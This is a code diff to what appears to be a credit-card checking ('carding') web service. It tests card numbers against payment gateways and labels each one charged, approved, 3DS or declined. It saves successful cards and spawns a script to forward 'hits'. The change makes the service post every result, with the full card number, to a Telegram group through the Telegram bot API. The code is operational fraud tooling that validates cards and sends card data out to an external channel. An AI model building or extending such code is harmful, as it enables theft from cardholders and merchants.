@@ -99,14 +99,15 @@ function sendLogsGroupTelegram(card: string, gateway: string, response: string, 
     const botToken = (cfg.TELEGRAM_BOT_TOKEN || "").trim();
     const logsGroupId = String(cfg.logs_group_id || "").trim();
     if (!botToken || !logsGroupId || logsGroupId === "0" || logsGroupId === "") return;
-    const statusUpper = (status || "").toUpperCase();
-    const icon = statusUpper === "CHARGED" ? "\uD83D\uDD25" : statusUpper === "APPROVED" ? "\u2705" : "\u274C";
+    const s = (status || "").toUpperCase();
+    const icon = s === "CHARGED" ? "\uD83D\uDD25" : s === "APPROVED" ? "\u2705" : s === "3DS" ? "\uD83D\uDD10" : "\u274C";
+    const label = s === "CHARGED" ? "CHARGED \uD83D\uDD25" : s === "APPROVED" ? "APPROVED \u2705" : s === "3DS" ? "3DS DECLINED \uD83D\uDD10" : "DECLINED \u274C";
     const lines = [
-      `${icon} [${statusUpper}] Log`,
-      `\uD83D\uDC64 ${userName || userId}`,
-      `\uD83D\uDCB3 Card: <code>${card}</code>`,
-      `\u2194\uFE0F Gateway: ${gateway || ""}`,
-      `\uD83D\uDCDD Response: ${response || ""}`,
+      `${icon} <b>[${label}]</b>`,
+      `\uD83D\uDC64 <b>User:</b> ${userName || userId}`,
+      `\uD83D\uDCB3 <b>Card:</b> <code>${card}</code>`,
+      `\u2194\uFE0F <b>Gateway:</b> ${gateway || ""}`,
+      `\uD83D\uDCDD <b>Response:</b> ${response || ""}`,
     ];
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -1629,11 +1630,13 @@ export async function registerRoutes(
           const responseStr = parsed.response || parsed.status || "";
           const responseLower = responseStr.toLowerCase();
           const isHit = parsed.status === "charged" || responseLower.includes("insufficient") || responseLower.includes("insuff");
+          const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
+          const logStatus = parsed.status === "charged" ? "CHARGED" : parsed.status === "approved" ? "APPROVED" : parsed.status === "live" ? "3DS" : "DECLINED";
+          sendLogsGroupTelegram(cardClean, gateway, responseStr, logStatus, userName, req.session.userId);
 
           if (parsed.status === "charged") {
             const forwardScript = path.join(botDir, "web_forward_hit.py");
-            const fwUserName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
-            const fwProc = spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, gateway, parsed.response || "Charged", fwUserName], {
+            const fwProc = spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, gateway, parsed.response || "Charged", userName], {
               cwd: botDir,
               env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
               timeout: 15000,
@@ -1642,9 +1645,7 @@ export async function registerRoutes(
           }
 
           if (isHit) {
-            const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
             saveChargedCC(cardClean, gateway, req.session.userId, userName);
-            sendLogsGroupTelegram(cardClean, gateway, responseStr, parsed.status === "charged" ? "CHARGED" : "APPROVED", userName, req.session.userId);
             addActivity({
               type: "hit",
               userName,
@@ -1792,6 +1793,8 @@ export async function registerRoutes(
           const resultResponse = result.response || result.status || "";
           const resultLower = resultResponse.toLowerCase();
           const isBatchHit = result.status === "charged" || resultLower.includes("insufficient") || resultLower.includes("insuff");
+          const batchLogStatus = result.status === "charged" ? "CHARGED" : result.status === "approved" ? "APPROVED" : result.status === "live" ? "3DS" : "DECLINED";
+          sendLogsGroupTelegram(card, job.gateway, resultResponse, batchLogStatus, job.userName || job.userId, job.userId);
 
           if (result.status === "charged") {
             const botDir = path.resolve(process.cwd(), "bot");
@@ -1806,7 +1809,6 @@ export async function registerRoutes(
 
           if (isBatchHit) {
             saveChargedCC(card, job.gateway, job.userId, job.userName);
-            sendLogsGroupTelegram(card, job.gateway, resultResponse, result.status === "charged" ? "CHARGED" : "APPROVED", job.userName || job.userId, job.userId);
             addActivity({
               type: "hit",
               userName: job.userName,
